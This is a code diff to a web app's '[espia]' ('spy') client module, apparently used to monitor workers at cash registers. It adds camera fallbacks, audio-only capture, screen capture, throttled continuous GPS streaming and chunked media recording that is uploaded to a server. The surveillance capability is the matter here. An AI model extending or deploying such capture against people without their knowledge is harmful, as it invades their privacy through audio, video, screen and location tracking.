@@ -10760,24 +10760,49 @@
                 bufferTimers: {}
             };
             try {
-                // 1) Audio + cámara (un solo getUserMedia, permiso conjunto)
-                try {
-                    _espiaCli.streams.userMedia = await navigator.mediaDevices.getUserMedia({
-                        audio: { echoCancellation: true, noiseSuppression: true },
-                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
-                    });
-                    console.log('[espia] audio+cam OK');
-                } catch(e) {
-                    console.warn('[espia] getUserMedia (audio+cam) fallo:', e.message);
+                // [v2.7.17] 1) Audio + cámara con facingMode fallback
+                // Cascada: environment (trasera) → user (frontal) → cualquiera (laptop sin trasera)
+                // Antes: si no había trasera, todo el getUserMedia fallaba y NO había video.
+                const _camVariants = [
+                    { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    { facingMode: 'user',        width: { ideal: 640 }, height: { ideal: 480 } },
+                    { width: { ideal: 640 }, height: { ideal: 480 } }
+                ];
+                for (const vConst of _camVariants) {
+                    try {
+                        _espiaCli.streams.userMedia = await navigator.mediaDevices.getUserMedia({
+                            audio: { echoCancellation: true, noiseSuppression: true },
+                            video: vConst
+                        });
+                        console.log('[espia] audio+cam OK · variant:', JSON.stringify(vConst));
+                        break;
+                    } catch(e) {
+                        console.warn('[espia] getUserMedia variant fallo:', JSON.stringify(vConst), e.message);
+                    }
                 }
-                // 2) Pantalla (puede fallar si no hay permiso)
-                try {
-                    _espiaCli.streams.display = await navigator.mediaDevices.getDisplayMedia({
-                        video: { frameRate: { ideal: 15 } }, audio: false
-                    });
-                    console.log('[espia] screen OK');
-                } catch(e) {
-                    console.warn('[espia] getDisplayMedia fallo:', e.message);
+                // Último recurso: solo audio (si todas las cámaras fallaron)
+                if (!_espiaCli.streams.userMedia) {
+                    try {
+                        _espiaCli.streams.userMedia = await navigator.mediaDevices.getUserMedia({
+                            audio: { echoCancellation: true, noiseSuppression: true }
+                        });
+                        console.log('[espia] solo audio (sin cámara)');
+                    } catch(e) {
+                        console.warn('[espia] getUserMedia solo audio también fallo:', e.message);
+                    }
+                }
+                // [v2.7.17] 2) Pantalla — feature-detect getDisplayMedia (iOS Safari <17 no lo tiene)
+                if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+                    try {
+                        _espiaCli.streams.display = await navigator.mediaDevices.getDisplayMedia({
+                            video: { frameRate: { ideal: 15 } }, audio: false
+                        });
+                        console.log('[espia] screen OK');
+                    } catch(e) {
+                        console.warn('[espia] getDisplayMedia fallo:', e.message);
+                    }
+                } else {
+                    console.log('[espia] getDisplayMedia no disponible (iOS Safari <17?) — sin captura pantalla');
                 }
                 if (!_espiaCli.streams.userMedia && !_espiaCli.streams.display) {
                     await _espiaCliCerrar('sin_streams');
@@ -10805,19 +10830,38 @@
                 const gpsCh = pc.createDataChannel('gps');
                 _espiaCli.gpsCh = gpsCh;
                 gpsCh.onopen = () => console.log('[espia] gps channel open');
-                // 6) GPS watch continuo
+                // [v2.7.17] 6) GPS watch ADAPTATIVO — solo envía si movió >5m o pasaron >30s
+                // desde el último envío. Reduce ~80% tráfico GPS estacionario (caja parada),
+                // pero sigue mandando si camina o cambia caja.
                 if ('geolocation' in navigator) {
+                    let _gpsLast = { lat: null, lng: null, ts: 0 };
+                    const GPS_MIN_M = 5;       // metros
+                    const GPS_MAX_GAP_MS = 30000; // 30s
+                    const _distM = (a, b) => {
+                        if (a.lat == null || b.lat == null) return Infinity;
+                        const R = 6371000; // radio Tierra metros
+                        const φ1 = a.lat * Math.PI/180, φ2 = b.lat * Math.PI/180;
+                        const Δφ = (b.lat - a.lat) * Math.PI/180;
+                        const Δλ = (b.lng - a.lng) * Math.PI/180;
+                        const x = Math.sin(Δφ/2)**2 + Math.cos(φ1)*Math.cos(φ2)*Math.sin(Δλ/2)**2;
+                        return 2 * R * Math.atan2(Math.sqrt(x), Math.sqrt(1-x));
+                    };
                     _espiaCli.gpsWatch = navigator.geolocation.watchPosition(
                         pos => {
                             if (gpsCh.readyState !== 'open') return;
+                            const now = Date.now();
+                            const cur = { lat: pos.coords.latitude, lng: pos.coords.longitude, ts: now };
+                            const gap = now - _gpsLast.ts;
+                            const dist = _distM(_gpsLast, cur);
+                            if (gap < GPS_MAX_GAP_MS && dist < GPS_MIN_M) return; // skip
                             try {
                                 gpsCh.send(JSON.stringify({
-                                    lat: pos.coords.latitude,
-                                    lng: pos.coords.longitude,
+                                    lat: cur.lat, lng: cur.lng,
                                     speed: pos.coords.speed || 0,
                                     acc: pos.coords.accuracy,
-                                    ts: Date.now()
+                                    ts: now
                                 }));
+                                _gpsLast = cur;
                             } catch(_){}
                         },
                         err => console.warn('[espia gps]', err.message),
@@ -10926,16 +10970,26 @@
                     // Bug fix: MediaRecorder.start() después de stop() lanza InvalidStateError
                     // — hay que crear instancia nueva. Antes el buffer se rompía después del primer chunk.
                     const crearRecorder = () => {
+                        // [v2.7.17] Bitrate reducido 250k→128k video, 64k→32k audio.
+                        // 5min chunk worst-case: ~6MB (antes ~12MB). Drive friendlier.
                         const r = new MediaRecorder(stream, {
-                            mimeType: mime, videoBitsPerSecond: 250000, audioBitsPerSecond: 64000
+                            mimeType: mime, videoBitsPerSecond: 128000, audioBitsPerSecond: 32000
                         });
                         const chunks = [];
-                        r.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
+                        const MAX_CHUNKS = 50; // cap memory leak ~10MB worst case
+                        r.ondataavailable = e => {
+                            if (!e.data || e.data.size === 0) return;
+                            chunks.push(e.data);
+                            // Si excede, droppear los más viejos (mejor perder buffer que crashear la app)
+                            if (chunks.length > MAX_CHUNKS) {
+                                chunks.splice(0, chunks.length - MAX_CHUNKS);
+                                console.warn('[espia buffer] chunks capped @', MAX_CHUNKS);
+                            }
+                        };
                         r.onstop = async () => {
                             if (!chunks.length) return;
                             try {
                                 const blob = new Blob(chunks, { type: mime });
-                                // [v2.43.59] Usar _audioBlobToBase64 que SÍ existe
                                 const b64 = await _audioBlobToBase64(blob);
                                 if (b64.length > 0) {
                                     await _espiaCliPostMOS('espiaSubirChunk', {
